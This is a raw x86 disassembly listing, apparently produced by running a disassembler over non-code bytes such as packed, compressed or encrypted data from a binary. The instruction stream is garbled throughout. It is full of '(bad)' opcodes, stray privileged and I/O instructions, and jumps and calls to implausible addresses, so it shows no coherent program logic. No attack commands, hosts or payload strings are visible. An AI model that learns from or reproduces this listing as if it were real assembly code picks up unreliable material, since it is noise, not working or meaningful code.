  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
